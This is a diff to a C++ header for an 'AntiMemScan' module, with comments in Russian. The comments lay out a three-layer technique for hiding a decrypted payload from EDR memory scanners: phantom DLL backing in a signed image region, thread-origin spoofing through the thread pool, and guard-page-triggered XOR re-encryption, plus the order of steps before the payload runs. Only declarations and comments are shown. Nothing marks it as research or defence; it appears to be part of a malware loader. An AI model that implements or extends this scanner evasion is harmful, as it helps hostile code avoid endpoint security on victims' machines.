@@ -14,18 +14,29 @@
 namespace AntiMemScan
 {
     // Включить трёхуровневую защиту от сканеров памяти:
+    //
     //   Layer 1: Phantom DLL Backing — payload в MEM_IMAGE регионе (подписанная DLL)
+    //            Активируется через bPhantomDLL → Phantom::Execute()
+    //
     //   Layer 2: Thread Origin Normalization — поток стартует из легитимного модуля
-    //   Layer 3: Anti-Scanner Detection — Guard Page + XOR ре-шифрация при сканировании
+    //            Активируется через bThreadPool (TpAllocWork) или bCallbackDiv
+    //            bThreadNormalization → автороутинг через ThreadPool
+    //
+    //   Layer 3: Guard Page + XOR ре-шифрация — при EDR сканировании payload
+    //            XOR-шифруется, сканер видит мусор. ReArm работает из VEH.
+    //            Активируется здесь в Enable().
+    //
+    // Временная диаграмма:
+    //   [Decrypt] → Enable(L3) → payload защищён → Disable(L3) → Execute(L1+L2)
     //
     // payloadBase/payloadSize — адрес и размер расшифрованного payload
     // xorKey/keyLen — ключ для XOR ре-шифрации при детекте сканера
     //
-    // Возвращает true если хотя бы один уровень успешно активирован.
+    // Возвращает true если Layer 3 успешно активирован.
     bool Enable(void* payloadBase, size_t payloadSize,
                 unsigned char* xorKey, size_t keyLen);
 
-    // Отключить защиту — снять Guard Page, очистить состояние.
+    // Отключить Layer 3 — снять Guard Page, расшифровать payload.
     // Вызывать перед выполнением payload.
     void Disable();
 
